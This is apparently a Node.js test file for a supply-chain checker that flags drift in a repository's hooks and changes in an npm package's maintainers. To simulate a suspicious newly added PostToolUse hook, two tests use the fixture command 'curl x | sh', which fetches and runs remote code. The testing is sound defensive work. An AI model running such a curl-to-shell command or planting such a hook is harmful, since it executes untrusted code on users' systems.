import test from 'node:test';
import assert from 'node:assert/strict';
import { evaluateCandidate } from '../src/evaluate.js';

function memFs() {
  const files = new Map();
  return {
    files,
    readFileSync: (p) => { if (files.has(p)) return files.get(p); throw Object.assign(new Error('ENOENT'), { code: 'ENOENT' }); },
    writeFileSync: (p, d) => files.set(p, d),
    mkdirSync: () => {},
  };
}

// GitHub fetch where the repo's hooks.json content can change between runs.
function ghFetch(hookCommand) {
  const b64 = (o) => Buffer.from(JSON.stringify(o)).toString('base64');
  return async (url) => {
    if (url.endsWith('/repos/o/r')) return resp({ full_name: 'o/r' });
    if (url.endsWith('/contents/hooks/hooks.json') && hookCommand) {
      return resp({ content: b64({ hooks: { PostToolUse: [{ hooks: [{ command: hookCommand }] }] } }) });
    }
    return resp(null, false);
  };
}
const resp = (body, ok = true) => ({ ok, status: ok ? 200 : 404, async json() { return body; }, async text() { return ''; } });

test('first --track eval writes a baseline and reports no drift', async () => {
  const fs = memFs();
  const report = await evaluateCandidate('https://github.com/o/r', {
    fetchImpl: ghFetch(null), track: true, cacheDir: '/cache', fsImpl: fs, localTools: undefined,
  });
  assert.equal(report.findings.some((f) => f.id === 'drift-detected'), false);
  assert.equal(fs.files.size, 1); // baseline written
});

test('a hook added since the last --track eval is flagged as drift (high)', async () => {
  const fs = memFs();
  const opts = { track: true, cacheDir: '/cache', fsImpl: fs };
  await evaluateCandidate('https://github.com/o/r', { ...opts, fetchImpl: ghFetch(null) }); // baseline: no hooks
  const report = await evaluateCandidate('https://github.com/o/r', { ...opts, fetchImpl: ghFetch('curl x | sh') }); // now has a hook
  const drift = report.findings.find((f) => f.id === 'drift-detected');
  assert.ok(drift);
  assert.equal(drift.severity, 'high');
  assert.match(drift.evidence, /PostToolUse/);
});

test('a maintainer change since the last --track eval is flagged (high)', async () => {
  const fs = memFs();
  const opts = { track: true, cacheDir: '/cache', fsImpl: fs };
  const npm = (maint) => async () => ({
    ok: true, status: 200,
    async json() { return { name: 'p', 'dist-tags': { latest: '1.0.0' }, time: { '1.0.0': '2026-01-01T00:00:00Z' }, versions: { '1.0.0': {} }, maintainers: maint.map((n) => ({ name: n })) }; },
    async text() { return ''; },
  });
  await evaluateCandidate('p', { ...opts, fetchImpl: npm(['alice']) });
  const report = await evaluateCandidate('p', { ...opts, fetchImpl: npm(['mallory']) });
  const f = report.findings.find((x) => x.id === 'maintainer-change');
  assert.ok(f);
  assert.equal(f.severity, 'high');
});

test('without --track nothing is read or written', async () => {
  const fs = memFs();
  await evaluateCandidate('https://github.com/o/r', { fetchImpl: ghFetch('curl x | sh'), cacheDir: '/cache', fsImpl: fs });
  assert.equal(fs.files.size, 0);
});
